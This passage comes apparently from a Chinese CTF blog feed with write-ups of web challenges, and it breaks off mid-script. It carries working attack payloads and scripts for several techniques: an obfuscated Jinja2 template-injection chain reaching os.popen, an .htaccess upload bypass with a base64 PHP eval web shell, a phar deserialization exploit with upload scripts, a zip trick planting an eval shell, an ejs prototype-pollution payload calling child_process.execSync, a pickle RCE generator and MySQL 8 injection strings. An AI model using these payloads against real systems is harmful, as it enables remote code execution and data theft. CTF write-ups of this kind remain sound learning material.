class="language-none">username&#x3D;&#123;%25set%0dpoint&#x3D;config|string|truncate(4)|last%25&#125;&#123;%25set%0dcxhx&#x3D;config|join|truncate(28)|replace(point,wu)|last%25&#125;&#123;%25set%0dca&#x3D;config|join|truncate(23)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcb&#x3D;config|join|truncate(9)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcc&#x3D;config|join|truncate(31)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcd&#x3D;config|join|truncate(7)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dce&#x3D;config|join|truncate(4)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcf&#x3D;config|join|truncate(98)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcg&#x3D;config|join|truncate(11)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dch&#x3D;config|join|truncate(203)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dci&#x3D;config|join|truncate(16)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcj&#x3D;config|join|truncate(429)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dck&#x3D;config|join|truncate(75)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcl&#x3D;config|join|truncate(96)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcm&#x3D;config|join|truncate(81)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcn&#x3D;config|join|truncate(5)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dco&#x3D;config|join|truncate(21)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcp&#x3D;config|join|truncate(19)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcq&#x3D;config|join|truncate(294)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcr&#x3D;config|join|truncate(20)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcs&#x3D;config|join|truncate(14)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dct&#x3D;config|join|truncate(12)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcu&#x3D;config|join|truncate(10)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcv&#x3D;config|join|truncate(6)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcx&#x3D;config|join|truncate(30)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcy&#x3D;config|join|truncate(77)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcz&#x3D;config|join|truncate(533)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dglo&#x3D;cxhx%2Bcxhx%2Bcg%2Bcl%2Bco%2Bcb%2Bca%2Bcl%2Bcs%2Bcxhx%2Bcxhx%25&#125;&#123;%25set%0dcla&#x3D;cxhx%2Bcxhx%2Bcc%2Bcl%2Bca%2Bcs%2Bcs%2Bcxhx%2Bcxhx%25&#125;&#123;%25set%0dooo&#x3D;lipsum|attr(glo)|attr(cp%2Bco%2Bcp)(co%2Bcs)%25&#125;&#123;%25set%0da1&#x3D;config|string|truncate(300)|replace(point,wu)|list%25&#125;&#123;&#123;a1|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a1|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;%25set%0dgang&#x3D;a1|attr(cp%2Bco%2Bcp)()%25&#125;&#123;%25set%0da2&#x3D;config|list|string|truncate(20)|replace(point,wu)|list%25&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;%25set%0dspace&#x3D;a2|attr(cp%2Bco%2Bcp)()%25&#125;&#123;&#123;ooo|attr(cp%2Bco%2Bcp%2Bce%2Bcn)(cc%2Bca%2Bct%2Bspace%2Bgang%2Bcf%2Bcl%2Bca%2Bcg)|attr(cr%2Bce%2Bca%2Bcd)()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ban的真多////////////</p><p>一个获取所有字母的小脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"ENVDEBUGTESTINGPROPAGATE_EXCEPTIONSPRESERVE_CONTEXT_ON_EXCEPTIONSECRET_KEYPERMANENT_SESSION_LIFETIMEUSE_X_SENDFILESERVER_NAMEAPPLICATION_ROOTSESSION_COOKIE_NAMESESSION_COOKIE_DOMAINSESSION_COOKIE_PATHSESSION_COOKIE_HTTPONLYSESSION_COOKIE_SECURESESSION_COOKIE_SAMESITESESSION_REFRESH_EACH_REQUESTMAX_CONTENT_LENGTHSEND_FILE_MAX_AGE_DEFAULTTRAP_BAD_REQUEST_ERRORSTRAP_HTTP_EXCEPTIONSEXPLAIN_TEMPLATE_LOADINGPREFERRED_URL_SCHEMEJSON_AS_ASCIIJSON_SORT_KEYSJSONIFY_PRETTYPRINT_REGULARJSONIFY_MIMETYPETEMPLATES_AUTO_RELOADMAX_COOKIE_SIZE"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">:</span>    kkk<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span>j<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            ini<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"字符</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">：set%0dc</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">=config|join|truncate(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ini<span class="token punctuation">&#125;</span></span><span class="token string">)|replace(point,wu)|last|lower"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用做出的字符变量拼接使用，反复使用pop直到拿到自己想要的字符，最后将os模块pop出进行使用（这也导致了这个payload只能一次性使用，使用一次破坏一次环境）</p>        <h2 id="funny-upload"   >          <a href="#funny-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2>      <p>.htaccess解析漏洞</p><p>先构造htaccess文件内容</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传图片发现确实被以php文件解析了，而后尝试构造图片马，最终发现<code>&lt;?</code>被过滤，尝试各种标签（php7不支持）绕过无果，00%截断无果，查询得知htaccess也有类似.user.ini的文件包含功能<code>php_value auto_append_file  &quot;文件名&quot;</code>相当于执行<code>include(&quot;文件名&quot;)</code>此处可使用PHP过滤器，所以可以先构造a文件包含base64编码后的木马，而后再使用过滤器解码包含执行</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;1.pngPD9waHAgZXZhbCgkX1BPU1RbJ2trayddKTs&#x2F;Pg&#x3D;&#x3D;&#x2F;&#x2F;.htaccessAddType application&#x2F;x-httpd-php .pngphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.png&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时再上传任意png并访问即可执行图片马（居然还ban系统命令执行）</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011424854.png"></p><p><strong>后面就是跟着各位大佬WP做出来并且学习到的新知识啦</strong></p>        <h2 id="PharPOP"   >          <a href="#PharPOP" class="heading-link"><i class="fas fa-link"></i></a><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2>      <p>进去之后首先发现传不进去东西，由于Error的存在直接传入无法调用<code>__destruct</code>方法也就不能上传文件，看了大佬wp发现是通过构造和反序列化字符串不相等的变量声明数量来导致反序列化过程报错，使得内容被销毁执行<code>__destruct</code>方法</p><p>下一步就是构造反序列化链了，最终利用到的是air中的<code>__set</code>方法利用PHP原生类读文件</p><blockquote><p>要触发air类的<code>__set</code>魔术方法，需要给不可访问属性赋值，apple类中<code>__get</code>有赋值 ，触发<code>__get</code>需要读取不可访问属性的值，需要触发tree中<code>__call</code>，<code>__call</code>是要调用内部不存在的方法，tree中<code>__destruct</code>方法内return $this-&gt;name();。</p><p>再回到air类，我们需要p(value)，p为DirectoryIterator，value为glob://xxxx，又因为apple-get触发air-set，所以apple-flag的值会传给 value，所以让<code>apple -&gt;flag=‘glob://xxx’</code> 对于$p，air-get中$p=nana中不存在act属性，<code>_̲_get</code>被触发，返回act，…p为act，所以让act=DirectoryIterator。</p><p>回到最外层的tree，要触发<code>__destruct</code>方法需要利用phpGC机制</p><p>————————————————<br>原文链接：<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/weixin_46081055/article/details/125046554" >https://blog.csdn.net/weixin_46081055/article/details/125046554</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>最终构造的exp如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">air</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">tree</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">banana</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$air</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$bana</span> <span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">banana</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">-></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'glob:///f*'</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">-></span><span class="token property">xxx</span><span class="token operator">=</span> <span class="token variable">$air</span> <span class="token punctuation">;</span><span class="token variable">$air</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$bana</span><span class="token punctuation">;</span><span class="token variable">$bana</span><span class="token operator">-></span><span class="token property">act</span><span class="token operator">=</span><span class="token string double-quoted-string">"DirectoryIterator"</span><span class="token punctuation">;</span><span class="token variable">$tree</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span> <span class="token variable">$apple</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar1.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$tree</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">NULL</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里我们要修改一下生成的phar文件，触发php的垃圾回收机制来让tree的<code>__destruct</code>方法执行</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311902654.png"></p><p>将此处的1修改为0</p><p>因为<strong>反序列化的过程是顺序执行</strong>的，所以到第一个属性时，会将<code>Array[0]</code>设置为<code>tree</code>对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>tree</code>对象便丢失了引用，就会被GC所捕获，就可以执行<code>__destruct</code>了。</p><p>此时由于phar文件被修改，所以我们需要修复一下文件签名，python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./phar1.phar'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 修改内容后的phar文件</span>s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token comment"># 获取要签名的数据</span>h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># 获取签名类型以及GBMB标识</span>newf <span class="token operator">=</span> s<span class="token operator">+</span>sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>h <span class="token comment"># 数据 + 签名 + 类型 + GBMB</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar2.phar'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>newf<span class="token punctuation">)</span> <span class="token comment"># 写入新文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下一步就是要将文件上传上去了，这里用python脚本来将内容上传</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> gzip<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://602ad6c4-4397-47e9-a1ea-d957fe9c0e7c.node4.buuoj.cn:81/'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./phar2.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token comment">#打开文件</span>file_out <span class="token operator">=</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./phar.zip"</span><span class="token punctuation">,</span> <span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token comment">#创建压缩文件对象，因为不压缩过不了WAF</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_out<span class="token punctuation">)</span>file_out<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>file_out<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'O:1:"D":2:&#123;s:5:"start";s:1:"w";&#125;'</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./phar.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># file_get_contents触发phar反序列化</span>res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'O:1:"D":2:&#123;s:5:"start";s:1:"r";&#125;'</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar:///tmp/6e1fdc42161a607b4fcdec2222a38881.jpg'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311910669.png"></p>        <h2 id="ezip"   >          <a href="#ezip" class="heading-link"><i class="fas fa-link"></i></a><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h2>      <p>首先是个zip利用的<span class="exturl"><a class="exturl__link"   href="https://ucasers.cn/zip%E5%9C%A8CTF-web%E6%96%B9%E5%90%91%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/" >大佬总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这里要利用的是这个</p><blockquote><p>这里根据zip里面压缩着的文件一个个解压，只要执行过<code>php_zip_extract_file</code>函数，相应的文件夹之下就会出现那个对应的文件。也就是说如果zip包里面第一个文件能被解压但是第二个文件有错误的话，整个命令的的执行会报错但第一个文件在报错前已经被写下来了。</p><p>里面有一个关于php解压漏洞的，如果压缩包其中有一个文件的文件名巨长，就会报错，但是里面的木马已经被解压了。所以直接拿那个脚本进行一波跑：</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> io mf <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>mf<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_STORED<span class="token punctuation">)</span> <span class="token keyword">as</span> zf<span class="token punctuation">:</span>    zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">b'@&lt;?php eval($_POST[1])?>'</span><span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">5000</span><span class="token punctuation">,</span> <span class="token string">b'AAAAA'</span><span class="token punctuation">)</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"shell.zip"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>mf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试读取flag发现没有权限，whoami之后发现用户为www-data，<span class="exturl"><a class="exturl__link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >suid提权</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，nl命令走</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311941868.png"></p><p>捞到flag</p>        <h2 id="NodeSoEasy"   >          <a href="#NodeSoEasy" class="heading-link"><i class="fas fa-link"></i></a><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2>      <p>题目中给了源码，也给了所使用框架的版本号，非常明显的原型链污染，但是在ejs 3.1.7中已经将<code>outputFunctionName</code>的原型链污染漏洞修复了<del>所以我用这个链子干了半天也没结果</del>，看wp利用的是另一个链子<code>escapeFunction</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205312011891.png"></p>        <h2 id="middle"   >          <a href="#middle" class="heading-link"><i class="fas fa-link"></i></a><a href="#middle" class="headerlink" title="middle"></a>middle</h2>      <p>pickle反序列化捏，自己构造脚本咯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import base64import pickleimport configdef <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">People</span><span class="token punctuation">(</span><span class="token keyword type-casting">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token class-name return-type">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>config<span class="token operator">.</span>backdoor<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"os.popen('cat /flag*').read()"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token function">People</span><span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> pickle<span class="token operator">.</span><span class="token function">dumps</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token operator">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2022</title>
      <link href="/posts/8cbc7f95.html"/>
      <url>/posts/8cbc7f95.html</url>
      
        <content type="html"><![CDATA[        <h3 id="Easy-SQL"   >          <a href="#Easy-SQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#Easy-SQL" class="headerlink" title="Easy-SQL"></a>Easy-SQL</h3>      <p>select被ban了，只能先尝试捞出数据库了</p><pre class="line-numbers language-none"><code class="language-none">database：securityuser：testversion：8.0.28<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>没有select只能看MySQL8的新特性了</p><p>使用mysql8.x的新增命令values直接union输出</p><p><strong>系统表更换为InnoDB表</strong></p><p>系统表全部换成事务型的innodb表，默认的MySQL实例将不包含任何MyISAM表，除非手动创建MyISAM表</p><p><strong>TABLE STATEMENT</strong></p><p>table语句是mysql8.0.19引入的语句，作用是返回表的全部内容，也就是返回表的行和列</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">table</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">union</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>VALUES STATEMENT</strong></p><p>values语句通过给出值的方式直接组成一个表，也就是可以把一个或者多个数据作为表来展示出来，返回的是一个表数据,当用union查询时，列数如果不对会发生报错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用<code>?id=0||(&#39;~&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)&gt;(table information_schema.columns limit 1)</code></p><p>找到information_schema.columns中共有22列数据，脚本爆破出表名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token 